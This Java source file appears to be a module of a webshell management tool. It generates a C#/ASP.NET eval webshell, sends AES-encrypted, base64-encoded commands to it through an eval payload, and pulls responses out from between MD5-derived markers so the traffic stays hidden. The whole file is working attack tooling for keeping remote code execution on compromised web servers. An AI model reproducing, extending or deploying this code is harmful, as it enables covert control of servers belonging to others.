package shells.cryptions.cshapAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "CSHAP_EVAL_AES_BASE64", payloadName = "CShapDynamicPayload")
public class CSharpEvalAesBase64 implements Cryption {
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String evalContent;
    private String findStrLeft;
    private String findStrRight;
    private Http http;
    private String key;
    private String pass;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override 
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.shell.getSecretKey() + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
        this.findStrRight = findStrMd5.substring(16).toUpperCase();
        this.evalContent = generateEvalContent();
        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
                return;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public byte[] encode(byte[] data) {
        try {
            return (String.format("%s=%s&", this.pass, this.evalContent) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(functions.base64Decode(findStr(data)));
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
    }

    public String generateEvalContent() {
        return URLEncoder.encode(String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", URLEncoder.encode(functions.base64Encode(new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getClassLoader().getResourceAsStream("shell/asp/template/eval.bin"))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey()).getBytes()))));
    }

    @Override 
    public boolean isSendRLData() {
        return true;
    }

    @Override 
    public boolean check() {
        return this.state;
    }

    @Override 
    public byte[] generate(String password, String secretKey) {
        return new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getClassLoader().getResourceAsStream("shell/asp/template/evalShell.bin"))).replace("{pass}", password).getBytes();
    }
}
